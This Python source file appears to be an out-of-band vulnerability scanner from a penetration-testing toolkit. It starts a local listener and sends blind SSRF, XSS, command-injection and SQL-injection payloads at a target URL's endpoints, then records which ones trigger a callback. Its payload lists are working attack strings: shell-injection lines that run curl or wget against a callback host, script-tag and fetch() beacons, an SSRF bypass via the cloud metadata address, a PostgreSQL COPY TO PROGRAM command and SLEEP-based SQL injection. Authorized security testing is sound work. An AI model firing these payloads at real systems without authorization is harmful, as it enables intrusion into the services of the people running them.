#!/usr/bin/env python3
"""
oob_probe.py — Out-of-Band / Blind Detection Engine.

Detects vulnerabilities that produce zero visible response change:
  - Blind SSRF (HTTP callback via internal token)
  - Blind XSS (script tag with OOB beacon)
  - Blind SQLi (time-based + OOB DNS canary)
  - Blind Command Injection (curl/wget canary beacon)
  - Blind Path Traversal (file read confirmation via DNS ping)

Architecture:
  1. Spins up a lightweight local HTTP listener on a random high port
  2. Generates a unique per-payload token (UUID4 hex)
  3. Fires payloads with the token baked in as a callback to 127.0.0.1:<port>/hit/<token>
  4. Waits up to --timeout seconds for a hit on each token
  5. Reports confirmed hits with token, source IP, and triggering vector

For real external OOB detection (blind SSRF from a remote server), pair with an
ngrok / interactsh / Burp Collaborator URL passed via --oob-host.
The local listener confirms blind injection on the SAME host (localhost pentest apps).
"""
import argparse
import http.server
import json
import os
import re
import sys
import threading
import time
import urllib.parse
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

# ── Payload templates — {token} is substituted per-test, {host}:{port} is the listener ──

SSRF_PAYLOADS = [
    # Injected into URL-type parameters
    "http://{host}:{port}/hit/{token}",
    "http://{host}:{port}/hit/{token}?q=ssrf",
    # Cloud IMDS → redirect to OOB (if the server fetches it internally)
    "http://169.254.169.254@{host}:{port}/hit/{token}",
    # IPv6 localhost bypass
    "http://[::1]:{port}/hit/{token}",
    # URL-encoded
    "http://{host}%3A{port}/hit/{token}",
]

BLIND_XSS_PAYLOADS = [
    '<img src=x onerror="fetch(\'http://{host}:{port}/hit/{token}\')">',
    '<script src="http://{host}:{port}/hit/{token}.js"></script>',
    '"><script>new Image().src="http://{host}:{port}/hit/{token}"</script>',
    "javascript:fetch('http://{host}:{port}/hit/{token}')",
    "<svg/onload=fetch(`http://{host}:{port}/hit/{token}`)>",
]

BLIND_CMD_PAYLOADS = [
    "; curl http://{host}:{port}/hit/{token}",
    "| curl http://{host}:{port}/hit/{token}",
    "|| curl http://{host}:{port}/hit/{token}",
    "& curl http://{host}:{port}/hit/{token}",
    "`curl http://{host}:{port}/hit/{token}`",
    "$(curl http://{host}:{port}/hit/{token})",
    "; wget -q -O- http://{host}:{port}/hit/{token}",
    "\n curl http://{host}:{port}/hit/{token}",
    # PowerShell
    "; Invoke-WebRequest http://{host}:{port}/hit/{token}",
]

BLIND_SQLI_TIME_PAYLOADS = [
    # PostgreSQL: sleep(n) callback via COPY TO PROGRAM
    "'; SELECT pg_sleep(3)--",
    "1; WAITFOR DELAY '0:0:3'--",
    "1 AND SLEEP(3)--",
    # With OOB DNS (only works if DB has network access)
    "'; COPY (SELECT '') TO PROGRAM 'curl http://{host}:{port}/hit/{token}'--",
    "' AND LOAD_FILE(CONCAT('\\\\\\\\',({SELECT hex(version())}),'.{token}.burp.oob'))--",
]

# Endpoints and parameter patterns to probe with SSRF payloads
SSRF_PROBE_TARGETS = [
    ("/api/config",             "url",      "GET",  None),
    ("/api/chat",               "messages", "POST", None),
    ("/api/fetch",              "url",      "POST", None),
    ("/api/render",             "url",      "POST", None),
    ("/api/proxy",              "target",   "POST", None),
    ("/api/webhook",            "url",      "POST", None),
    ("/api/import",             "url",      "POST", None),
    ("/api/screenshot",         "url",      "POST", None),
    ("/api/pdf",                "url",      "POST", None),
    ("/api/preview",            "url",      "GET",  None),
    ("/api/guestbook",          "text",     "POST", None),
    ("/api/health",             "callback", "GET",  None),
]

XSS_PROBE_TARGETS = [
    ("/api/guestbook", "text",    "POST"),
    ("/api/comment",  "content",  "POST"),
    ("/api/feedback", "message",  "POST"),
    ("/api/submit",   "data",     "POST"),
    ("/",             "q",        "GET"),
    ("/search",       "q",        "GET"),
]

CMD_PROBE_TARGETS = [
    ("/api/ping",    "host",     "POST"),
    ("/api/dns",     "domain",   "POST"),
    ("/api/lookup",  "target",   "POST"),
    ("/api/nslookup","host",     "POST"),
    ("/api/traceroute","host",   "POST"),
    ("/api/exec",    "cmd",      "POST"),
    ("/api/run",     "command",  "POST"),
    ("/api/health",  "target",   "GET"),
]


class _HitHandler(http.server.BaseHTTPRequestHandler):
    """Minimal HTTP server that records token hits from OOB callbacks."""
    hits = {}
    hits_lock = threading.Lock()

    def do_GET(self):
        m = re.match(r"^/hit/([a-f0-9\-]+)", self.path)
        if m:
            token = m.group(1)
            with _HitHandler.hits_lock:
                _HitHandler.hits[token] = {
                    "time": time.strftime("%H:%M:%S"),
                    "client": self.client_address[0],
                    "path": self.path,
                    "headers": dict(self.headers),
                }
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass  # suppress default Apache-style logs


class OOBProbe(VibeTool):
    def __init__(self):
        super().__init__("OOB Probe", "Out-of-Band / Blind Vulnerability Detection Engine")
        self._listener_port = None
        self._server = None
        self._server_thread = None

    # ── Listener lifecycle ─────────────────────────────────────────────────

    def _start_listener(self):
        import socket
        # Bind to a random available port
        with socket.socket() as s:
            s.bind(("0.0.0.0", 0))
            port = s.getsockname()[1]
        self._server = http.server.HTTPServer(("0.0.0.0", port), _HitHandler)
        self._listener_port = port
        self._server_thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._server_thread.start()
        self.log(f"OOB listener started on 0.0.0.0:{port}", "info")

    def _stop_listener(self):
        if self._server:
            self._server.shutdown()

    def _wait_for_hit(self, token, timeout=4):
        deadline = time.time() + timeout
        while time.time() < deadline:
            with _HitHandler.hits_lock:
                if token in _HitHandler.hits:
                    return _HitHandler.hits[token]
            time.sleep(0.1)
        return None

    def _new_token(self):
        return uuid.uuid4().hex[:16]

    # ── Vector builders ────────────────────────────────────────────────────

    def _fill(self, template, token, host="127.0.0.1"):
        return template.format(host=host, port=self._listener_port, token=token)

    def _fire(self, base, path, param, method, payload_str, token):
        """Send a single OOB payload and return (status, body)."""
        url = base + path
        if method == "GET":
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(payload_str)}"
            status, body, _ = self.safe_request(url, timeout=6)
        else:
            data = {param: payload_str}
            status, body, _ = self.safe_request(url, method="POST", data=data, timeout=6)
        return status, body

    # ── Attack vectors ─────────────────────────────────────────────────────

    def vector_blind_ssrf(self, base, hit_wait, oob_host):
        self.log("=== BLIND SSRF — OOB Callback Probes ===")
        confirmed = 0
        for path, param, method, _ in SSRF_PROBE_TARGETS:
            for tmpl in SSRF_PAYLOADS[:3]:          # top 3 per endpoint is enough
                token = self._new_token()
                payload = self._fill(tmpl, token, host=oob_host)
                status, _ = self._fire(base, path, param, method, payload, token)
                hit = self._wait_for_hit(token, timeout=hit_wait)
                if hit:
                    msg = (
                        f"BLIND SSRF CONFIRMED — {method} {path} param={param} "
                        f"callback from {hit['client']} at {hit['time']}"
                    )
                    self.log(msg, "hack")
                    self.record_finding(
                        title=f"Blind SSRF via {path} ({param})",
                        severity="critical",
                        location=f"{base}{path}",
                        evidence=f"OOB token={token} hit by {hit['client']}. Payload: {payload[:120]}",
                        recommendation="Whitelist outbound HTTP destinations; block RFC-1918/loopback on the egress firewall.",
                        cwe="CWE-918",
                        owasp="A10:2021-Server-Side Request Forgery",
                    )
                    confirmed += 1
                    break           # one confirmed hit per endpoint is enough
                elif status == 200:
                    self.log(f"  [200 no hit] {method} {path} param={param}", "info")
        return confirmed

    def vector_blind_xss(self, base, hit_wait, oob_host):
        self.log("=== BLIND XSS — OOB Beacon Probes ===")
        confirmed = 0
        for path, param, method in XSS_PROBE_TARGETS:
            for tmpl in BLIND_XSS_PAYLOADS[:2]:
                token = self._new_token()
                payload = self._fill(tmpl, token, host=oob_host)
                self._fire(base, path, param, method, payload, token)
                hit = self._wait_for_hit(token, timeout=hit_wait)
                if hit:
                    msg = f"BLIND XSS CONFIRMED — {method} {path} param={param} — beacon from {hit['client']}"
                    self.log(msg, "hack")
                    self.record_finding(
                        title=f"Blind XSS via {path} ({param})",
                        severity="high",
                        location=f"{base}{path}",
                        evidence=f"OOB beacon received. Token={token}. Payload: {payload[:100]}",
                        recommendation="HTML-encode all user output; apply a strict Content-Security-Policy.",
                        cwe="CWE-79",
                        owasp="A03:2021-Injection",
                    )
                    confirmed += 1
                    break
        return confirmed

    def vector_blind_cmd(self, base, hit_wait, oob_host):
        self.log("=== BLIND COMMAND INJECTION — curl/wget Beacon Probes ===")
        confirmed = 0
        for path, param, method in CMD_PROBE_TARGETS:
            for tmpl in BLIND_CMD_PAYLOADS[:3]:
                token = self._new_token()
                payload = self._fill(tmpl, token, host=oob_host)
                self._fire(base, path, param, method, payload, token)
                hit = self._wait_for_hit(token, timeout=hit_wait)
                if hit:
                    msg = f"BLIND COMMAND INJECTION CONFIRMED — {method} {path} param={param} — shell callback from {hit['client']}"
                    self.log(msg, "hack")
                    self.record_finding(
                        title=f"Blind Command Injection via {path} ({param})",
                        severity="critical",
                        location=f"{base}{path}",
                        evidence=f"Shell beacon received. Token={token}. Payload: {payload[:100]}",
                        recommendation="Never pass user input to shell commands; use subprocess with argument lists, never shell=True.",
                        cwe="CWE-78",
                        owasp="A03:2021-Injection",
                    )
                    confirmed += 1
                    break
        return confirmed

    def vector_time_sqli(self, base):
        """Time-based SQLi detection — no OOB listener needed, just timing."""
        self.log("=== TIME-BASED SQLi — Response Latency Probes ===")
        confirmed = 0
        endpoints = [
            ("/api/login",   {"username": "admin'--",          "password": "x"}),
            ("/api/search",  {"q": "' AND SLEEP(3)--"}),
            ("/api/user",    {"id": "1' AND SLEEP(3)--"}),
            ("/api/config",  {"key": "' AND SLEEP(3)--"}),
            ("/api/guestbook", {"text": "'; SELECT pg_sleep(3)--", "name": "x"}),
        ]
        for path, data in endpoints:
            t0 = time.perf_counter()
            status, _, _ = self.safe_request(
                base + path, method="POST", data=data, timeout=10
            )
            elapsed = time.perf_counter() - t0
            if elapsed >= 2.8:
                msg = f"TIME-BASED SQLi LIKELY — {path} delayed {elapsed:.2f}s (expected ~3s sleep)"
                self.log(msg, "crit")
                self.record_finding(
                    title=f"Time-Based SQL Injection via {path}",
                    severity="critical",
                    location=f"{base}{path}",
                    evidence=f"Response delayed {elapsed:.2f}s with sleep payload. HTTP {status}.",
                    recommendation="Use parameterised queries / prepared statements. Never interpolate user input into SQL.",
                    cwe="CWE-89",
                    owasp="A03:2021-Injection",
                )
                confirmed += 1
            else:
                self.log(f"  [{status} {elapsed:.2f}s] {path} — no delay", "info")
        return confirmed

    # ── Main run ───────────────────────────────────────────────────────────

    def run(self, url, hit_wait=4, oob_host="127.0.0.1", skip_listener=False):
        self.banner()
        base = url.rstrip("/")
        self.log(f"Target: {base} | OOB host: {oob_host} | Hit wait: {hit_wait}s")

        if not skip_listener:
            self._start_listener()
            # Let the listener warm up
            time.sleep(0.3)

        total = 0
        try:
            total += self.vector_blind_ssrf(base, hit_wait, oob_host)
            total += self.vector_blind_xss(base, hit_wait, oob_host)
            total += self.vector_blind_cmd(base, hit_wait, oob_host)
            total += self.vector_time_sqli(base)
        finally:
            if not skip_listener:
                self._stop_listener()

        self.log("=" * 32)
        if total:
            self.log(
                f"OOB CONFIRMED — {total} blind vulnerability(ies) detected with out-of-band callbacks.",
                "hack",
            )
        else:
            self.log(
                "No OOB callbacks received. Target appears clean for tested injection vectors.",
                "pass",
            )
        return 0 if total == 0 else 1


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="OOB Probe — Out-of-Band / Blind Vulnerability Detection Engine"
    )
    parser.add_argument("--url", required=True, help="Target base URL (e.g. http://localhost:3456)")
    parser.add_argument(
        "--oob-host",
        default="127.0.0.1",
        help="OOB callback host. Use 127.0.0.1 for localhost apps, or your ngrok/interactsh host for external targets.",
    )
    parser.add_argument(
        "--hit-wait",
        type=float,
        default=4.0,
        help="Seconds to wait for an OOB callback per payload (default: 4)",
    )
    parser.add_argument("-v", "--version", action="version", version="OOB Probe 1.0.0")
    args = parser.parse_args()
    sys.exit(OOBProbe().run(args.url, hit_wait=args.hit_wait, oob_host=args.oob_host))
